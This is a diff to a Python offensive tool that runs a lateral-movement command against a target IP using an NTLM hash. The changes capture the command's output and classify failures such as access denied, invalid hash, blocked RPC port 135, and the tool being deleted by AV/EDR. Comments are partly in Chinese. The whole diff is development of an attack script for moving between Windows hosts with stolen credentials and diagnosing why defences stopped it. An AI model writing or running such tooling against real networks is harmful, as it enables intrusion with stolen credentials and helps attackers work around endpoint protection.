@@ -74,17 +74,26 @@ def main():
         print(f"Authenticating as: {find_user}")
 
         try:
-            subprocess.run(attack_command, check=True)
+            result = subprocess.run(
+                attack_command, 
+                check=True, 
+                capture_output=True, 
+                text=True
+            )
+            print(result.stdout)
             print(f"[+] SUCCESS: Lateral movement to {target_ip} completed.")
 
         except subprocess.CalledProcessError as e:
-            error_msg = e.stderr.lower() if e.stderr else ""
+            std_out = e.stdout if e.stdout else ""
+            std_err = e.stderr if e.stderr else ""
+            error_msg = (std_out + std_err).lower()
             print(f"[-] FAILURE: Command failed with return code ({e.returncode}).")
 
             # --- 更加精確的判斷邏輯 ---
-            if "logon_failure" in error_msg or "access_denied" in error_msg:
-            print("    - Reason: Authentication Failed (Invalid Password/Hash) or Insufficient Privileges.")
-    
+            if "access_denied" in error_msg or "0xc0000022" in error_msg:
+                print("    - Reason: Access Denied (0xc0000022).")
+            elif "logon_failure" in error_msg or "0xc000006d" in error_msg:
+                print("    - Reason: Authentication Failed (Invalid NTLM Hash).")    
             elif "rpc_s_server_unavailable" in error_msg or "connection refused" in error_msg:
                 print("    - Reason: Network Connectivity Issue (Port 135 blocked or Target Offline).")
     
@@ -93,19 +102,13 @@ def main():
 
             elif e.returncode == 127:
                 print("    - Reason: Tool path error or Python environment issue.")
-    
-            elif e.returncode == 1:
-                # 如果沒有具體字串但 code 是 1，通常是通用錯誤或被防火牆丟包
-                print("    - Reason: General failure. Check Firewall, UAC settings, or Anti-Virus.")
-
             else:
-                print(f"    - Raw Error Output: {e.stderr.strip()}")
-                
-    except FileNotFoundError:
+                print(f"    - Raw Intercepted Error: {error_msg.strip()}")        
+        except FileNotFoundError:
             print(f"FAILURE: '{tool_name}' disappeared during execution!")
             print("Reason: Highly likely deleted by Real-Time Protection (AV/EDR).")
 
-    except Exception as e:
+        except Exception as e:
             print(f"FAILURE: An unexpected error occurred: {e}")
 
 if __name__ == "__main__":
